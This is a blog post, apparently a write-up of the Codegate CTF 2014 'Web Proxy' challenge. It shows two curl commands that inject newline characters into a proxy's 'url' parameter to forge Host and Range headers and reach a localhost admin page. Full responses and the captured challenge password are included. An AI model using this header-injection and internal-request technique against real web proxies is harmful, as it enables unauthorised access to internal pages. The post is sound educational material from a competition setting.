---
title: Codegate CTF Quals 2014 Web Proxy writeup
author: deadcat
layout: post
permalink: /2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/
comments: true
categories:
  - CTF
  - writeup
---

```
http://58.229.183.25/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php
```

Here is a GET param named "url", we could use it to get some header and body informaiton of a webpage.

and in the index.php's source code, we can find this:


	<!-- admin/index.php -->

So it's clear that we will use that GET param "url" to access /admin/index.php

use "localhost" instead of "58.229.183.25", and find out that a %0a(\n) will make the body information appears in header field, so there maybe some "http response splitting" trick

after several test, we use two step to got the key.

first step:

	DeAdCaT-2:tmp DeAdCaT___$ curl http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=127.0.1.1%2F188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/%20HTTP/1.1%0aHost:%20localhost%0aRange:%20bytes=370-%0a%0a
     <html>
     <head>
          <style type="text/css">
          body { margin:0; }
          * { font-family:fantasy; }
          p { height:50pt; font-size:50pt; background:green;  }
          input[type=text] { width:500; font-size:15pt; }
          input[type=submit] { width:150; font-size:15pt; }
          input[type=submit]:hover { background:lightblue; }
          table { font-size:15pt; border:0;}
          .err { background:yellow; font-weight:bold; }
          #l:hover{ color:white; font-weight:bold; }
          </style>
          <title>Web proxy</title>
     </head>
     <body bgcolor=gray><br>
     <p align=center><u><a id=l>W</a><a id=l>E</a><a id=l>B</a> <a id=l>P</a><a id=l>R</a><a id=l>O</a><a id=l>X</a><a id=l>Y</a></u></p>
     <center><form method=get action='/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php'><input type=text name=url value='127.0.1.1/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/ HTTP/1.1
     Host: localhost
     Range: bytes=370-

     '><input type=submit value='Submit'></form></center><table border=5 align=center cellpadding=10 width=1000><tr><td bgcolor=yellow><xmp>HTTP/1.1 206 Partial Content
     Date: Sat, 22 Feb 2014 16:11:08 GMT
     Server: Apache/2.4.6 (Ubuntu)
     X-Powered-By: PHP/5.5.3-1ubuntu2.1
     Vary: Accept-Encoding
     Content-Range: bytes 370-429/430
     Content-Length: 60
     Content-Type: text/html</xmp></td></tr><tr align=left><td bgcolor=silver><xmp>

     0
     <!--if($_SERVER[HTTP_HOST]=="hackme")--></body>
     .
     .
     .
     .
     .</xmp></td></tr></table><br>
     <!-- admin/index.php -->
     </body>
     </html>
     
second step:

	     DeAdCaT-2:tmp DeAdCaT___$ curl http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=127.0.1.1%2F188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/%20HTTP/1.1%0aHost:%20hackme%0aRange:%20bytes=80-%0a%0a
     <html>
     <head>
          <style type="text/css">
          body { margin:0; }
          * { font-family:fantasy; }
          p { height:50pt; font-size:50pt; background:green;  }
          input[type=text] { width:500; font-size:15pt; }
          input[type=submit] { width:150; font-size:15pt; }
          input[type=submit]:hover { background:lightblue; }
          table { font-size:15pt; border:0;}
          .err { background:yellow; font-weight:bold; }
          #l:hover{ color:white; font-weight:bold; }
          </style>
          <title>Web proxy</title>
     </head>
     <body bgcolor=gray><br>
     <p align=center><u><a id=l>W</a><a id=l>E</a><a id=l>B</a> <a id=l>P</a><a id=l>R</a><a id=l>O</a><a id=l>X</a><a id=l>Y</a></u></p>
     <center><form method=get action='/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php'><input type=text name=url value='127.0.1.1/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/ HTTP/1.1
     Host: hackme
     Range: bytes=80-

     '><input type=submit value='Submit'></form></center><table border=5 align=center cellpadding=10 width=1000><tr><td bgcolor=yellow><xmp>HTTP/1.1 206 Partial Content
     Date: Sat, 22 Feb 2014 15:51:11 GMT
     Server: Apache/2.4.6 (Ubuntu)
     X-Powered-By: PHP/5.5.3-1ubuntu2.1
     Vary: Accept-Encoding
     Content-Range: bytes 80-126/127
     Content-Length: 47
     Content-Type: text/html</xmp></td></tr><tr align=left><td bgcolor=silver><xmp>

     word is WH0_IS_SnUS_bI1G_F4N
     </body>
     .
     .
     .
     .4
     .</xmp></td></tr></table><br>
     <!-- admin/index.php -->
     </body>
     </html>
     
Password is WH0_IS_SnUS_bI1G_F4N

Cheers :)          
